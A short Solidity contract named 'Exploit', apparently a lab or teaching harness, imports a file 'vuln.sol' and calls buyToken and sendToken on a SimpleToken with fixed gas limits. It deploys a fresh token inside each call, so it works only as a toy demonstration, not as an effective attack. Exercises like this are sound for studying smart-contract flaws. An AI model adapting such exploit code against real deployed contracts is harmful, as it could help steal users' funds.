pragma solidity ^0.8.2;

import "./vuln.sol";

contract Exploit {
    
    function buyPoisoned() payable public {
        SimpleToken t = new SimpleToken();
        t.buyToken{gas: 50000, value: 10}();
    }

    function exploit(address recpt, uint amount) public {
        SimpleToken t = new SimpleToken();
        t.sendToken{gas: 50000}(recpt, amount);
    }
}
